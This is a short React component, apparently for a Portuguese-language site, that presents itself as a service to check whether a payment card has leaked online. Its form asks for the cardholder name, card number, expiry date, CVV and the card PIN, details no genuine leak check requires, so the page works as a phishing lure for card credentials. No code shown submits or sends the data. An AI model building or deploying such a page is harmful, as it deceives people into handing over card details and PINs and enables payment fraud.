import { BackCard } from "./components/backCard";
import { FrontCard } from "./components/frontCard";
import "./styles/global.css";

export function App() {
  return (
    <div className="main">
      <div className="card-background">
        <FrontCard />
        <BackCard />
      </div>

      <div className="container-main" style={{ flex: 1 }}>
        <h1 id="title">
          Veja se seu cartão <br />
          vazou na internet{" "}
        </h1>
        <form action="" id="form">
          <div className="info-card">
            <p>Nome no cartão</p>
            <input type="text" />
          </div>

          <div className="info-card">
            <p>Numero no cartão</p>
            <input type="text" />
          </div>

          <div style={{ display: "flex" }}>
            <div className="info-card date-info">
              <div className="date">
                <p>Data de expiração</p>
                <div className="date-inputs">
                  <input type="text" className="date-year" />
                  <input type="text" className="date-mounth" />
                </div>
              </div>

              <div className="info-card">
                <p>CVV</p>
                <input type="text" className="ccv" />
              </div>
            </div>
          </div>

          <div className="info-card">
            <p>Senha no cartão</p>
            <input type="text" />
          </div>

          <button className="button-verify">VERIFICAR</button>
        </form>
      </div>
    </div>
  );
}
